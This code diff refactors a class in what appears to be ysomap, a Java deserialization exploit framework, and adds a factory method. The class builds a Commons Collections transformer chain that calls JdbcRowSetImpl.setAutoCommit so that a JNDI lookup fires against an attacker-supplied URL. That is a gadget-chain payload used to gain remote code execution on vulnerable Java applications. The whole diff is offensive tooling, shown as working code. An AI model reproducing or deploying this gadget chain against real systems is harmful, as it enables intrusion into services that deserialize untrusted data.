@@ -3,7 +3,6 @@ package ysomap.bullets.collections;
 import ysomap.bullets.Bullet;
 import ysomap.bullets.jdk.JdbcRowSetImplBullet;
 import ysomap.common.annotation.*;
-import ysomap.core.util.ReflectionHelper;
 
 import java.util.LinkedList;
 
@@ -31,7 +30,7 @@ public class TransformerWithJNDIBullet extends AbstractTransformerBullet {
     public Object getObject() throws Exception {
         initClazz(version);
         Bullet jdbcRowSetImpl = new JdbcRowSetImplBullet();
-        ReflectionHelper.set(jdbcRowSetImpl, "jndiURL", jndiURL);
+        jdbcRowSetImpl.set("jndiURL", jndiURL);
         Object obj = jdbcRowSetImpl.getObject();
 
         LinkedList<Object> transformers = new LinkedList<>();
@@ -39,5 +38,12 @@ public class TransformerWithJNDIBullet extends AbstractTransformerBullet {
         transformers.add(createInvokerTransformer("setAutoCommit",
                             new Class[] {boolean.class}, new Object[]{true}));
         return createTransformerArray(transformers);
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        Bullet bullet = new TransformerWithJNDIBullet();
+        bullet.set("jndiURL", args[0]);
+        bullet.set("version", args[1]);
+        return bullet;
     }
 }
